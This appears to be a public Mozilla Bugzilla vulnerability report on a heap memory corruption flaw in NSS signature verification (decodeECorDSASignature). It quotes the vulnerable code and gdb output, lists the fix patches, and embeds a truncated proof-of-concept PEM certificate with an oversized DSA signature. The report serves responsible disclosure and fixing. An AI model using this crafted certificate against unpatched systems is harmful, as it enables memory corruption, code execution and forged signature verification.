        <h2 class="module-title" id="module-security-title">Security</h2>
          <h3 class="module-subtitle" id="module-security-subtitle">
            (public)
          </h3>
      </div>
    </header>
  <div class="module-content" id="module-security-content" style="display:none"
  ><div class="groups edit-hide">
    This bug is publicly visible.
</div>

<div class="groups edit-show" style="display:none">


</div>
  </div>
</section>


<section class="module edit-show" style="display:none" id="module-user-story" data-non-stick="1"
>
    <header id="module-user-story-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse User Story section"
           data-label-collapsed="Expand User Story section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-user-story-content"
             aria-expanded="false"
             aria-labeledby="module-user-story-title"
             aria-describedby="module-user-story-subtitle"></div>
        <h2 class="module-title" id="module-user-story-title">User Story</h2>
      </div>
    </header>
  <div class="module-content" id="module-user-story-content" style="display:none"
  >
    <pre id="user-story"></pre>
  </div>
</section>







<section class="module" id="module-attachments"
>
    <header id="module-attachments-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse Attachments section"
           data-label-collapsed="Expand Attachments section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-attachments-content"
             aria-expanded="true"
             aria-labeledby="module-attachments-title"
             aria-describedby="module-attachments-subtitle"></div>
        <h2 class="module-title" id="module-attachments-title">Attachments</h2>
          <h3 class="module-subtitle" id="module-attachments-subtitle">
            (6 files, 1 obsolete file)
          </h3>
      </div>
    </header>
  <div class="module-content" id="module-attachments-content"
  ><table role="table" class="responsive" id="attachments">
    <tr data-attachment-id="9247443" class="
    " >
      <td class="attach-desc-td">
        <div class="attach-desc">
          <a href="/attachment.cgi?id=9247443" > decoderECorDsaSignature.pem
            </a>
        </div>
        <div>
            <a href="#c0" class="attach-time activity-ref"><span class="rel-time" title="2021-10-24 07:59 PDT" data-time="1635087557">3 years ago</span></a>
          <span class="attach-author"><div class="vcard vcard_592223" ><a class="email " href="/user_profile?user_id=592223" > <span class="fna">taviso</span></a>
</div></span>
        </div>
        <div class="attach-info">9.00 KB,
          application/x-x509-ca-cert        </div>
      </td>
      <td></td>
      <td class="attach-actions">
        <a href="/attachment.cgi?id=9247443&amp;action=edit" data-details="1">Details</a>
    </tr>
    <tr data-attachment-id="9247769" class=" attach-patch
    " >
      <td class="attach-desc-td">
        <div class="attach-desc">
          <a href="/attachment.cgi?id=9247769" > Bug 1737470 - Ensure DER encoded signatures are within size limits. r=jschanck,mt,bbeurdouche,rrelyea
            </a>
        </div>
        <div>
            <a href="#c8" class="attach-time activity-ref"><span class="rel-time" title="2021-10-26 06:40 PDT" data-time="1635255644">3 years ago</span></a>
          <span class="attach-author"><div class="vcard vcard_644159" ><a class="email " href="/user_profile?user_id=644159" > <span class="fna">Dennis Jackson</span></a>
</div></span>
        </div>
        <div class="attach-info">48 bytes,
          text/x-phabricator-request        </div>
      </td>
      <td></td>
      <td class="attach-actions">
        <a href="/attachment.cgi?id=9247769&amp;action=edit" data-details="1">Details</a>&#x0020; |
  <a href="/attachment.cgi?id=9247769">Review</a>
    </tr>
    <tr data-attachment-id="9248072" class="
    " >
      <td class="attach-desc-td">
        <div class="attach-desc">
          <a href="/attachment.cgi?id=9248072" > rsapss-testcase.der
            </a>
        </div>
        <div>
            <a href="#c13" class="attach-time activity-ref"><span class="rel-time" title="2021-10-27 10:57 PDT" data-time="1635357462">3 years ago</span></a>
          <span class="attach-author"><div class="vcard vcard_592223" ><a class="email " href="/user_profile?user_id=592223" > <span class="fna">taviso</span></a>
</div></span>
        </div>
        <div class="attach-info">5.81 KB,
          application/x-x509-ca-cert        </div>
      </td>
      <td></td>
      <td class="attach-actions">
        <a href="/attachment.cgi?id=9248072&amp;action=edit" data-details="1">Details</a>
    </tr>
    <tr data-attachment-id="9248366" class="
    " >
      <td class="attach-desc-td">
        <div class="attach-desc">
          <a href="/attachment.cgi?id=9248366" > smime-test.eml
            </a>
        </div>
        <div>
            <a href="#c29" class="attach-time activity-ref"><span class="rel-time" title="2021-10-28 22:54 PDT" data-time="1635486880">3 years ago</span></a>
          <span class="attach-author"><div class="vcard vcard_592223" ><a class="email " href="/user_profile?user_id=592223" > <span class="fna">taviso</span></a>
</div></span>
        </div>
        <div class="attach-info">10.58 KB,
          message/rfc822        </div>
      </td>
      <td></td>
      <td class="attach-actions">
        <a href="/attachment.cgi?id=9248366&amp;action=edit" data-details="1">Details</a>
    </tr>
    <tr data-attachment-id="9248424" class=" attach-obsolete attach-patch
    " style="display:none">
      <td class="attach-desc-td">
        <div class="attach-desc">
          <a href="/attachment.cgi?id=9248424" > Thunderbird decoy workaround, v1 (moved to bug 1738501)
            </a>
        </div>
        <div>
            <a href="#c34" class="attach-time activity-ref"><span class="rel-time" title="2021-10-29 06:43 PDT" data-time="1635514994">3 years ago</span></a>
          <span class="attach-author"><div class="vcard vcard_36541" ><a class="email " href="/user_profile?user_id=36541" > <span class="fna">Kai Engert [:KaiE:]</span></a>
</div></span>
        </div>
        <div class="attach-info">9.62 KB,
          patch        </div>
      </td>
      <td></td>
      <td class="attach-actions">
        <a href="/attachment.cgi?id=9248424&amp;action=edit" data-details="1">Details</a>
          | <a href="/attachment.cgi?id=9248424&amp;action=diff">Diff</a>&#x0020; |
  <a href="/page.cgi?id=splinter.html&ignore=&bug=1737470&attachment=9248424">Splinter Review</a>
    </tr>
    <tr data-attachment-id="9248750" class="
    " >
      <td class="attach-desc-td">
        <div class="attach-desc">
          <a href="/attachment.cgi?id=9248750" > nss-vuln-functions.txt
            </a>
        </div>
        <div>
            <a href="#c51" class="attach-time activity-ref"><span class="rel-time" title="2021-11-01 11:47 PDT" data-time="1635792445">3 years ago</span></a>
          <span class="attach-author"><div class="vcard vcard_644159" ><a class="email " href="/user_profile?user_id=644159" > <span class="fna">Dennis Jackson</span></a>
</div></span>
        </div>
        <div class="attach-info">851 bytes,
          text/plain        </div>
      </td>
      <td></td>
      <td class="attach-actions">
        <a href="/attachment.cgi?id=9248750&amp;action=edit" data-details="1">Details</a>
    </tr>
    <tr data-attachment-id="9253226" class=" attach-patch
    " >
      <td class="attach-desc-td">
        <div class="attach-desc">
          <a href="/attachment.cgi?id=9253226" > Bug 1737470 - land NSS NSS_3_68_1_RTM UPGRADE_NSS_RELEASE, r=kaie
            </a>
        </div>
        <div>
            <a href="#c88" class="attach-time activity-ref"><span class="rel-time" title="2021-12-01 06:52 PST" data-time="1638370358">3 years ago</span></a>
          <span class="attach-author"><div class="vcard vcard_622637" ><a class="email " href="/user_profile?user_id=622637" > <span class="fna">Benjamin Beurdouche [:beurdouche]</span></a>
</div></span>
        </div>
        <div class="attach-info">48 bytes,
          text/x-phabricator-request        </div>
      </td>
      <td>
          <div class="attach-flag"><div class="vcard vcard_75935" ><span class="fn">RyanVM</span>
</div>:
              <a href="#c97"
                  class="flag-name-status rel-time-title activity-ref"
                  title="3 years ago"
              data-time="1638378056"
            >
              approval-mozilla-esr91+</a>
          </div></td>
      <td class="attach-actions">
        <a href="/attachment.cgi?id=9253226&amp;action=edit" data-details="1">Details</a>&#x0020; |
  <a href="/attachment.cgi?id=9253226">Review</a>
    </tr>
</table>

<footer id="attachments-footer">
  <div id="attachments-actions">
      <button type="button" id="attachments-obsolete-btn" class="secondary">Show Obsolete</button>
  </div>
  
</footer>
  </div>
</section>



<script nonce="hrUgBiJ1gSmCpS8CICfvhMnvLRfp7iuTPvDZbWaq6A0TCQEJ">
  init_module_visibility();
</script>




<meta name="firefox-versions" content="{&quot;FIREFOX_AURORA&quot;:&quot;&quot;,&quot;FIREFOX_DEVEDITION&quot;:&quot;135.0b1&quot;,&quot;FIREFOX_ESR&quot;:&quot;128.6.0esr&quot;,&quot;FIREFOX_ESR115&quot;:&quot;115.19.0esr&quot;,&quot;FIREFOX_ESR_NEXT&quot;:&quot;&quot;,&quot;FIREFOX_NIGHTLY&quot;:&quot;136.0a1&quot;,&quot;LAST_MERGE_DATE&quot;:&quot;2025-01-06&quot;,&quot;LAST_RELEASE_DATE&quot;:&quot;2025-01-07&quot;,&quot;LAST_SOFTFREEZE_DATE&quot;:&quot;2025-01-02&quot;,&quot;LAST_STRINGFREEZE_DATE&quot;:&quot;2025-01-03&quot;,&quot;LATEST_FIREFOX_DEVEL_VERSION&quot;:&quot;135.0b1&quot;,&quot;LATEST_FIREFOX_OLDER_VERSION&quot;:&quot;3.6.28&quot;,&quot;LATEST_FIREFOX_RELEASED_DEVEL_VERSION&quot;:&quot;135.0b1&quot;,&quot;LATEST_FIREFOX_VERSION&quot;:&quot;134.0&quot;,&quot;NEXT_MERGE_DATE&quot;:&quot;2025-02-03&quot;,&quot;NEXT_RELEASE_DATE&quot;:&quot;2025-02-04&quot;,&quot;NEXT_SOFTFREEZE_DATE&quot;:&quot;2025-01-30&quot;,&quot;NEXT_STRINGFREEZE_DATE&quot;:&quot;2025-01-31&quot;}">


<div id="comment-actions">
    <button type="button" id="bottom-btn" class="secondary" aria-label="Go to Page Bottom">Bottom &darr;</button>
  <div class="dropdown">
    <button type="button" id="comment-tags-btn" aria-haspopup="true" aria-label="Tags"
      aria-expanded="false" aria-controls="comment-tags-menu" class="dropdown-button minor">Tags &#9662;</button>
    <ul id="comment-tags-menu" role="menu" tabindex="0" class="dropdown-content left" style="display:none">
      <li role="presentation">
        <a role="menuitem" tabindex="-1" data-comment-tag="">Reset</a>
      </li>
    </ul>
  </div>
  <div class="dropdown">
    <button type="button" id="view-menu-btn" aria-haspopup="true" aria-label="Timeline"
      aria-expanded="false" aria-controls="view-menu" class="dropdown-button minor">Timeline &#9662;</button>
    <ul id="view-menu" role="menu" tabindex="0" class="dropdown-content left" style="display:none">
      <li role="presentation">
        <a id="view-reset" role="menuitem" tabindex="-1">Reset</a>
      </li>
      <li role="separator"></li>
      <li role="presentation">
        <a id="view-collapse-all" role="menuitem" tabindex="-1">Collapse All</a>
      </li>
      <li role="presentation">
        <a id="view-expand-all" role="menuitem" tabindex="-1">Expand All</a>
      </li>
      <li role="presentation">
        <a id="view-comments-only" role="menuitem" tabindex="-1">Comments Only</a>
      </li>
    </ul>
   </div>
</div>
<div class="change-set" id="c0"><div class="comment" data-id="15626066" data-no="0"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-0" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_592223" ><img src="https://secure.gravatar.com/avatar/27c1a60000797d8e229249290a7c7377?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_592223" ><a class="email " href="/user_profile?user_id=592223" > <span class="fna">taviso</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-0"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-0" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c0">Description</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-10-24 07:59 PDT" data-time="1635087557">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-0">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div id="att-9247443"
         class="attachment"
         data-id="9247443" itemscope itemtype="http://schema.org/MediaObject">
      <meta itemprop="name" content="decoderECorDsaSignature.pem">
      <meta itemprop="contentSize" content="9215">
      <meta itemprop="encodingFormat" content="application/x-x509-ca-cert">
      <div class="label">
        Attached file
          <a class="link" href="attachment.cgi?id=9247443" itemprop="contentUrl" >
        <span id="att-9247443-description" itemprop="description">decoderECorDsaSignature.pem</span></a>
        â€” <a href="attachment.cgi?id=9247443&amp;action=edit" itemprop="url" data-details="1">Details</a>
      </div>
    </div>

  <div
      class="comment-text markdown-body "
      id="ct-0" data-comment-id="15626066"><p>I&#39;ve found an exploitable memory corruption flaw when validating ECDSA signatures.</p>
<p>The <code>VFYContext</code> structure contains a decoded digital signature from a DER encoded certificate, and is defined like this in <code>cryptohi/secvfy.c</code>:</p>
<p><a href="https://searchfox.org/mozilla-central/source/security/nss/lib/cryptohi/secvfy.c#120" rel="nofollow">https://searchfox.org/mozilla-central/source/security/nss/lib/cryptohi/secvfy.c#120</a></p>
<pre><code>struct VFYContextStr {
    SECOidTag hashAlg; /* the hash algorithm */
    SECKEYPublicKey *key;
    /*
     * This buffer holds either the digest or the full signature
     * depending on the type of the signature (key-&gt;keyType).  It is
     * defined as a union to make sure it always has enough space.
     *
     * Use the &quot;buffer&quot; union member to reference the buffer.
     * Note: do not take the size of the &quot;buffer&quot; union member.  Take
     * the size of the union or some other union member instead.
     */
    union {
        unsigned char buffer[1];

        /* the full DSA signature... 40 bytes */
        unsigned char dsasig[DSA_MAX_SIGNATURE_LEN];
        /* the full ECDSA signature */
        unsigned char ecdsasig[2 * MAX_ECKEY_LEN];
        /* the full RSA signature, only used in RSA-PSS */
        unsigned char rsasig[(RSA_MAX_MODULUS_BITS + 7) / 8];
    } u;
    unsigned int pkcs1RSADigestInfoLen;
    /* the encoded DigestInfo from a RSA PKCS#1 signature */
    unsigned char *pkcs1RSADigestInfo;
    void *wincx;
    void *hashcx;
    const SECHashObject *hashobj;
    SECOidTag encAlg;    /* enc alg */
    PRBool hasSignature; /* true if the signature was provided in the
                          * VFY_CreateContext call.  If false, the
                          * signature must be provided with a
                          * VFY_EndWithSignature call. */
    SECItem *params;
};
</code></pre>
<p>In the code above, <code>MAX_EC_KEY</code> is 72.</p>
<p>The definition of <code>decodeECorDsaSignature()</code> is here:</p>
<p><a href="https://searchfox.org/mozilla-central/source/security/nss/lib/cryptohi/secvfy.c#173" rel="nofollow">https://searchfox.org/mozilla-central/source/security/nss/lib/cryptohi/secvfy.c#173</a></p>
<pre><code>static SECStatus
decodeECorDSASignature(SECOidTag algid, const SECItem *sig, unsigned char *dsig,
                       unsigned int len)
</code></pre>
<p>Here <code>dsig</code> will usually point at a <code>VFYContext.u.ecdsasig</code>, but <code>len</code> is the length of the (untrusted) signature. Therefore, it&#39;s the responsibility of <code>decodeECorDSASignature</code> to verify that that the length is under <code>MAX_ECKEY_LEN</code>. This is done correctly for <code>SEC_OID_ANSIX962_EC_PUBLIC_KEY</code>:</p>
<pre><code>    if (algid == SEC_OID_ANSIX962_EC_PUBLIC_KEY) {
        if (len &gt; MAX_ECKEY_LEN * 2) {
            PORT_SetError(SEC_ERROR_BAD_DER);
            return SECFailure;
        }
    }
</code></pre>
<p>This seems like a fragile design though, and indeed this routine also handles <code>SEC_OID_ANSIX9_DSA_SIGNATURE</code> but doesn&#39;t check the length in that case. I&#39;ve made and attached a demo certificate.</p>
<pre><code>(gdb) list
196	    dsasig = DSAU_DecodeDerSigToLen((SECItem *)sig, len);
197	
198	    if ((dsasig == NULL) || (dsasig-&gt;len != len)) {
199	        rv = SECFailure;
200	    } else {
201	        PORT_Memcpy(dsig, dsasig-&gt;data, dsasig-&gt;len);
202	    }
203	
204	    if (dsasig != NULL)
205	        SECITEM_FreeItem(dsasig, PR_TRUE);
(gdb) p dsasig-&gt;len
$14 = 4096
(gdb) x/10xb dsasig-&gt;data 
0x621000001500: 0xee    0xee    0xee    0xee    0xee    0xee    0xee    0xee
0x621000001508: 0xee    0xee
</code></pre>
<p>This is from my DER:</p>
<pre><code>$ openssl x509 -inform DER -text -noout &lt; decodeECorDSASignature.der 
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number: 1 (0x1)
        Signature Algorithm: dsaWithSHA1
        Issuer: CN = decodeECorDSASignature-testCase/taviso
        Validity
            Not Before: Jan  1 00:00:00 2021 GMT
            Not After : Jan  1 00:00:00 2041 GMT
        Subject: CN = decodeECorDSASignature-testCase/taviso
        Subject Public Key Info:
            Public Key Algorithm: dsaEncryption
                pub:  (Negative)
                    22:22:22:22:22:22:22:22:22:22:22:22:22:22:22:
        ...
            Signature Algorithm: dsaWithSHA1
         r:   
             00:ee:ee:ee:ee:ee:ee:ee:ee:ee:ee:ee:ee:ee:ee:
        ...
</code></pre>
<p>And where did <code>dsig</code> come from?</p>
<pre><code>(gdb) up
#1  0x0000000000b52a08 in vfy_CreateContext (key=0x61d00000bea0, sig=0x7fffffffc8a0, encAlg=SEC_OID_ANSIX9_DSA_SIGNATURE, hashAlg=SEC_OID_SHA1, hash=0x7fffffffc8f0, wincx=0x0) at secvfy.c:499
499	                rv = decodeECorDSASignature(encAlg, sig, cx-&gt;u.buffer, sigLen);
(gdb) pt cx-&gt;u
type = union {
    unsigned char buffer[1];
    unsigned char dsasig[64];
    unsigned char ecdsasig[144];
    unsigned char rsasig[2048];
}
</code></pre>
<p>Any value length greater than 2048 (the largest union member) will corrupt memory. From here you can execute code or corrupt the <code>VFYContextStr</code>, allowing any signature or certificate to verify.</p>
<pre><code>-----BEGIN CERTIFICATE-----
MIIaZzCCCkWgAwIBAgIBATALBgcqhkjOOAQDBQAwMTEvMC0GA1UEAxMmZGVjb2Rl
RUNvckRTQVNpZ25hdHVyZS10ZXN0Q2FzZS90YXZpc28wHhcNMjEwMTAxMDAwMDAw
WhcNNDEwMTAxMDAwMDAwWjAxMS8wLQYDVQQDEyZkZWNvZGVFQ29yRFNBU2lnbmF0
dXJlLXRlc3RDYXNlL3RhdmlzbzCCCaYwggkaBgcqhkjOOAQBMIIJDQKBgQCqqqqq
qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq
qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq
qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqgKCCAEAu7u7u7u7u7u7u7u7u7u7
u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7
u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7
u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7
u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7
u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7
u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7
u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7
u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7
u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7
u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7
u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7
u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7
u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7
u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7
u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7
u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7
u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7
u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7
u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7
u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7
u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7
u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7
u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7
u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7
u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7
u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7
u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7
u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7
u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7
u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7
u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7
u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7
u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7
u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7
u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7
u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7
u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7
u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7
u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7
u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7
u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7
u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7
u7u7u7u7u7u7u7u7u7u7u7sCgYEAzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzM
zMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzM
zMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzM
zMzMzMwDgYUAAoGB3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d
3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d
3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3dMAkG
ByqGSM44BAMDghAPADCCEAoCgggBAO7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u
7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u
7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u
7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u
7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u
7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u
7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u
7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u
7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u
7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u
7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u
7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u
7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u
7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u
7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u
7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u
7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u
7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u
7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u
7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u
7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u
7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u
7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u
7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u
7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u
7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u
7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u
7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u
7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u
7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u
7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u
7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u
7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u
7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u
7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u
7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u
7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u
7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u
7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u
7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u
7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u
7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u
7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u
7u7u7u7uAoIIAQD/////////////////////////////////////////////////
////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////
